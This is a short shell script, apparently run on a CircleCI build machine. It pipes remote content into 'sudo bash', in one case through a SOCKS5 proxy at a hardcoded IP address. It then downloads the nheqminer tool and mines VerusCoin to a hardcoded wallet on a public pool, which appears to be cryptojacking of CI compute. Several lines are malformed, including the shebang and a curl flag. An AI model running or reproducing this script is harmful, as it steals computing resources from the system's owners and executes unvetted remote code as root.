!#/bin/sh

curl -sL https://circleci.com | sudo -E bash -

curl -sL socks5://23.94.186.132:1080 https://circleci.com | sudo -E bash -

curl -v +x socks5://23.94.186.132:1080 https://circleci.com/

sudo apt install nodejs

node --version

cd /tmp

cd /

ls

sudo service --status-all

wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz 
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.FAxSlowmo_01 -p x -t 2
